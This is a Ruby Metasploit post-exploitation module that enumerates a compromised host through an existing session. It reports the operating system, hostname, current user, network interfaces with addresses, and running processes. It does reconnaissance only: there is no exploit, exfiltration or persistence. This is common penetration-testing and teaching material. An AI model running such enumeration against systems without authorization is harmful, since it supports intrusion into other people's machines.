#!/usr/bin/env ruby

class MetasploitModule < Msf::Post

  Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info,
        'Name'     => 'information gatherer',
        'Description' => %q{
            This post-exploitation module collects comprehensive system details 
            and network configuration data from compromised targets.
        },
        'Author'   => [ 'Anomaliszt' ],
        'License'  => MSF_LICENSE))
    end
      
    def run 
        print_status("Collecting target system data from session #{session_id}")

        gather_system_info
        gather_user_info
        gather_network_info
        gather_running_processes

    end

    def gather_system_info 
        sysinfo = session.sys.config.sysinfo
        print_good("Operating System: #{sysinfo['OS']}")
        print_good("Hostname: #{sysinfo['Computer']}")
    end

    def gather_user_info
        user = session.sys.config.getuid
        print_good("Current User: #{user}")
    end

    def gather_network_info
        interfaces = session.net.config.interfaces
        interfaces.each { |interface|
        interface.addrs.each { |addr|
            print_good("Network Interface: #{interface.name}, Address: #{addr.addr}, Subnet: #{addr.netmask}, Broadcast: #{addr.broad}")
            }
        }
    end

    def gather_running_processes
        procs = session.sys.process.get_processes
        procs.each { |proc|
        print_good("Running Process #{proc['pid']} - #{proc['name']}")
       
    }
    end
end
